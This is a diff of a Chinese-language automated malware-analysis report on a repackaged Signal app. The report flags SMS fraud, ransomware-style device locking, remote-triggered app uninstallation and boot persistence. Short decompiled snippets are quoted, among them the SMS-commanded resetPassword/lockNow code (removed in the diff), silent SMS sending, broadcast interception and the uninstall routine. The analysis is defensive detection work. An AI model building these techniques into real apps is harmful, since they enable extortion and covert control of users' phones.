@@ -6,70 +6,9 @@
     "应用名": "GKB SmsSecurity",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 313.0
+    "分析耗时(秒)": 1019.2
   },
   "行为列表": [
-    {
-      "行为": "sms_fraud",
-      "中文名": "短信欺诈",
-      "MITRE": "T1416",
-      "置信度": "likely",
-      "子行为": [
-        {
-          "子行为": "sms_send",
-          "中文名": "短信发送",
-          "置信度": "likely",
-          "证据": {
-            "方法引用": [],
-            "权限": [
-              "android.permission.SEND_SMS"
-            ],
-            "字符串": [
-              "sendTextMessage",
-              "SmsManager"
-            ]
-          }
-        },
-        {
-          "子行为": "sms_intercept",
-          "中文名": "短信拦截",
-          "置信度": "likely",
-          "证据": {
-            "方法引用": [],
-            "权限": [
-              "android.permission.RECEIVE_SMS"
-            ],
-            "字符串": [
-              "abortBroadcast"
-            ]
-          }
-        }
-      ],
-      "恶意代码": [
-        {
-          "class_path": "Lorg\\thoughtcrime\\securesms\\transport\\SmsTransport;",
-          "method_signature": "for(int i = 0; i < messages.size()",
-          "malicious_behavior": "sms_fraud",
-          "behavior_type": "malicious",
-          "risk_level": "高",
-          "malicious_code_snippet": "String recipient = message.getIndividualRecipient().getNumber();\nSmsManager.getDefault().sendMultipartTextMessage(recipient, null, messages, sentIntents, deliveredIntents);\nSmsManager.getDefault().sendTextMessage(recipient, null, messages.get(i), sentIntents.get(i), deliveredIntents == null ? null : deliveredIntents.get(i));",
-          "malicious_code_snippet_context": "          ArrayList<String> messages = SmsManager.getDefault().divideMessage(message.getBody().getBody());\n          ArrayList<PendingIntent> sentIntents = constructSentIntents(message.getId(), message.getType(), messages, false);\n          ArrayList<PendingIntent> deliveredIntents = constructDeliveredIntents(message.getId(), message.getType(), messages);\n>>>         String recipient = message.getIndividualRecipient().getNumber();\n>>>         try {\n>>>             SmsManager.getDefault().sendMultipartTextMessage(recipient, null, messages, sentIntents, deliveredIntents);\n          } catch (NullPointerException npe) {\n              Log.w(\"SmsTransport\", npe);\n              Log.w(\"SmsTransport\", \"Recipient: \" + recipient);",
-          "behavior_description": "代码通过 SmsManager API 静默发送短信，无需用户交互确认。先尝试调用 sendMultipartTextMessage 批量发送长短信，若失败则降级逐条调用 sendTextMessage 发送。在已确认的恶意样本中，此静默短信发送能力通常被用于向高级收费号码发送短信或向C2服务器回传数据，直接造成用户经济损失。包名伪装为 org.thoughtcrime.securesms（Signal），增加隐蔽性。",
-          "glm_analyzed": true
-        },
-        {
-          "class_path": "Lorg\\thoughtcrime\\securesms\\DatabaseMigrationActivity;",
-          "method_signature": "onReceive(Context context, Intent intent)",
-          "malicious_behavior": "sms_fraud",
-          "behavior_type": "malicious",
-          "risk_level": "高",
-          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) { abortBroadcast(); }",
-          "malicious_code_snippet_context": "          }\n  \n          @Override // android.content.BroadcastReceiver\n>>>         public void onReceive(Context context, Intent intent) {\n              abortBroadcast();\n          }\n      }",
-          "behavior_description": "定义了一个名为 NullReceiver 的 BroadcastReceiver，在 onReceive 方法中直接调用 abortBroadcast() 中止广播传播。当该接收器以高优先级注册接收短信广播（SMS_RECEIVED）时，会拦截 incoming 短信并阻止系统默认短信应用及其他应用收到该短信，导致用户无法看到被拦截的短信。数据流向：系统短信广播 Intent → abortBroadcast() 中止广播",
-          "glm_analyzed": true
-        }
-      ]
-    },
     {
       "行为": "ransomware",
       "中文名": "勒索软件",
@@ -110,14 +49,47 @@
       ],
       "恶意代码": [
         {
-          "class_path": "Lorg\\thoughtcrime\\securesms\\xlibs\\SmsCommand;",
-          "method_signature": "if(this.sNumber != \"0\")",
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xlibs\\myFunctions;",
+          "method_signature": "?(?)",
           "malicious_behavior": "ransomware",
           "behavior_type": "malicious",
-          "risk_level": "高",
-          "malicious_code_snippet": "case LOCK:\n    if (this.sNumber != \"0\") {\n        DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(\"device_policy\");\n        dpm.resetPassword(this.sNumber, 1);\n        dpm.lockNow();\n    }",
-          "malicious_code_snippet_context": "                  myFunctions.clearBuffers(ctx);\n                  myFunctions.setVar(\"PHONE_NUMBER\", \"\", ctx);\n                  return;\n>>>             case LOCK:\n>>>                 if (this.sNumber != \"0\") {\n>>>                     DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(\"device_policy\");\n>>>                     dpm.resetPassword(this.sNumber, 1);\n>>>                     dpm.lockNow();\n>>>                     myFunctions.sendSmsLog(\"Device locked\", ctx);\n                      return;\n                  }\n                  return;",
-          "behavior_description": "通过SMS指令触发LOCK命令，使用DevicePolicyManager的resetPassword将设备密码重置为攻击者通过短信下发的sNumber值，随后调用lockNow()立即锁定屏幕，实现勒索软件的锁屏勒索行为。数据来源为远程SMS指令中的sNumber字段→危险操作为DevicePolicyManager.resetPassword()+lockNow()。",
+          "risk_level": "中",
+          "malicious_code_snippet": "import android.app.admin.DevicePolicyManager;\nimport android.content.ComponentName;",
+          "malicious_code_snippet_context": "  \n  import android.annotation.SuppressLint;\n  import android.app.PendingIntent;\n>>> import android.app.admin.DevicePolicyManager;\n>>> import android.content.ComponentName;\n  import android.content.Context;\n  import android.content.Intent;\n  import android.content.SharedPreferences;",
+          "behavior_description": "该代码位于被重打包的 Signal 应用中被注入的恶意子包 org.thoughtcrime.securesms.xlibs.myFunctions（原始 Signal 开源代码不存在 xlibs 子包，为攻击者注入模块）。代码引入了 DevicePolicyManager（设备策略管理器）和 ComponentName，这是 Android 勒索软件实现设备锁定的典型组合：通过 ComponentName 注册 DeviceAdminReceiver 骗取设备管理员权限（source），随后调用 DevicePolicyManager.lockNow() 立即锁定屏幕或 resetPassword() 重置锁屏密码（sink），使用户无法正常操作设备，进而实施勒索。结合该样本已被厂商确认为恶意样本及 ransomware.device_lock 行为类别，此处 DevicePolicyManager 的使用判定为勒索锁屏恶意行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xpack\\ActDelete;",
+          "method_signature": "doUpdate(View view)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", this.sPackage, null));\nstartActivityForResult(intent, 48);\nif (!isAppPresent(this.sPackage)) {\n    myFunctions.sendLog(\"UNINST\", String.format(\"Application %s uninstalled\", this.sPackage), this);\n}",
+          "malicious_code_snippet_context": "      }\n  \n      public void doUpdate(View view) {\n>>>         Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", this.sPackage, null));\n>>>         startActivityForResult(intent, 48);\n>>>     }\n>>> \n>>>     @Override // android.app.Activity\n      protected void onActivityResult(int requestCode, int resultCode, Intent data) {\n          switch (requestCode) {\n              case 48:",
+          "behavior_description": "该Activity从启动Intent的extra中获取外部下发的目标包名与应用名，界面文案将'-software-'替换为目标应用名进行诱导展示；doUpdate()构造指向目标包的ACTION_DELETE系统卸载Intent并启动卸载流程；卸载成功后在onActivityResult中通过myFunctions.sendLog将'UNINST'结果上报远程服务器。数据流：getIntent().getStringExtra(\"package\")（外部指令，疑似C2下发）→ ACTION_DELETE卸载Intent（startActivityForResult）→ sendLog回传卸载结果到远端。该代码位于重打包Signal的xpack远控模块中，属于远程触发卸载任意应用的组件，虽经系统确认框非完全静默，但结合诱导性UI与卸载结果回传，典型用途是诱导用户卸载安全软件或竞争应用，构成恶意远控行为。",
           "glm_analyzed": true
         }
       ]
@@ -141,9 +113,9 @@
           "malicious_behavior": "device_reboot",
           "behavior_type": "grayware",
           "risk_level": "中",
-          "malicious_code_snippet": "context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));",
-          "malicious_code_snippet_context": "      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n          myFunctions.sendLog(\"REBOOT\", \"Device reboot fixed. Service started after reboot.\", context);\n>>>         context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));\n      }\n  }",
-          "behavior_description": "OnBootReceiver 监听设备开机完成广播（BOOT_COMPLETED），在设备重启后自动启动名为 XMainProcessStart 的后台服务，实现开机自启与持久化保活。该行为使恶意应用在设备重启后能够自动恢复运行，维持恶意进程的持续驻留。数据流向：系统开机广播(BOOT_COMPLETED) → startService() 启动恶意主进程服务。",
+          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));\n}",
+          "malicious_code_snippet_context": "      final String LOG_TAG = \"myLogs\";\n  \n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         myFunctions.sendLog(\"REBOOT\", \"Device reboot fixed. Service started after reboot.\", context);\n>>>         context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", DraftDatabase.DRAFT_VALUE));\n      }\n  }",
+          "behavior_description": "该代码位于伪装成Signal（org.thoughtcrime.securesms）的恶意样本中注入的xbroadcast包内，是一个开机广播接收器。它监听系统BOOT_COMPLETED广播，在设备重启完成后通过context.startService()自动拉起名为XMainProcessStart的恶意主进程服务，实现恶意软件在设备重启后自动恢复运行的持久化保活机制。数据流向：系统开机完成广播Intent → onReceive()回调 → startService()重新启动恶意服务进程，保证恶意载荷持续驻留系统。",
           "glm_analyzed": true
         }
       ]
@@ -156,7 +128,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
